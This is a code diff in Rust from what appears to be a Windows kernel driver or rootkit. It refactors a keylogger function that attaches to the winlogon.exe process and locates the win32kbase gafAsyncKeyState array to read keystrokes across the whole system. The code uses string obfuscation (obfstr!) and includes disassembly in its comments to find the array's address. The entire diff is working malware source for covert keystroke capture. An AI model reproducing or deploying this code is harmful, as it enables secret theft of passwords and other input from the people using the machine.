@@ -16,7 +16,7 @@ use {
         },
         _MEMORY_CACHING_TYPE::MmCached, 
         _MM_PAGE_PRIORITY::NormalPagePriority, 
-        _MODE::UserMode, PEPROCESS
+        _MODE::UserMode,
     }
 };
 
@@ -32,8 +32,8 @@ pub static mut USER_ADDRESS: usize = 0;
 pub unsafe fn get_user_address_keylogger() -> Option<*mut c_void> {
     let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
     let winlogon_process = Process::new(pid)?;
-    let gaf_async_key_state_address = get_gafasynckeystate_address(pid, winlogon_process.e_process)?;
     let attach_process = ProcessAttach::new(winlogon_process.e_process);
+    let gaf_async_key_state_address = get_gafasynckeystate_address()?;
 
     // Check that the address is valid
     if MmIsAddressValid(gaf_async_key_state_address as *mut c_void) == 0 {
@@ -67,11 +67,9 @@ pub unsafe fn get_user_address_keylogger() -> Option<*mut c_void> {
 /// 
 /// `Option<PVOID>`: The address of the `gafAsyncKeyState` array if found, otherwise `None`.
 ///
-unsafe fn get_gafasynckeystate_address(pid: usize, process: PEPROCESS) -> Option<*mut u8> {
-    let winlogon_eprocess = Process::new(pid)?;
+unsafe fn get_gafasynckeystate_address() -> Option<*mut u8> {
     let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
     let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
-    let attach_process = ProcessAttach::new(winlogon_eprocess.e_process);
 
     // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
     // fffff4e1`18e41bb5 48 89 81 80 00 00 00  mov qword ptr [rcx+80h],rax
